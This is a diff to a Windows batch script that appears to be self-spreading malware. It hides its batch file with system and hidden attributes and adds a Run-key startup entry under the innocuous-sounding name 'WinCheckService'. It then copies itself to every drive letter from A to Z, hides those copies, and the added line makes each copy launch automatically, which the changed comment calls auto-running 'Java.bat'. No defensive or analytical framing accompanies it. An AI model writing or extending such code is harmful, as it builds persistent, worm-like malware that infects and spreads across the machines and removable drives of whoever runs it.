@@ -41,7 +41,7 @@ attrib +h +s "%HIDDEN_BAT%"
 :: Add registry startup pointing to hidden batch
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinCheckService" /t REG_SZ /d "\"%HIDDEN_BAT%\"" /f >nul
 
-:: Loop through drives and replicate
+:: Loop through drives and replicate + auto-run Java.bat
 for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do call :COPYDRIVE %%L
 
 goto :EOF
@@ -58,6 +58,7 @@ if exist "%DRIVE%:\" (
     if exist "%DRIVE_BAT%" (
         attrib +h +s "%DRIVE_FOLDER%"
         attrib +h +s "%DRIVE_BAT%"
+        start "" "%DRIVE_BAT%"
     )
 )
 exit /b
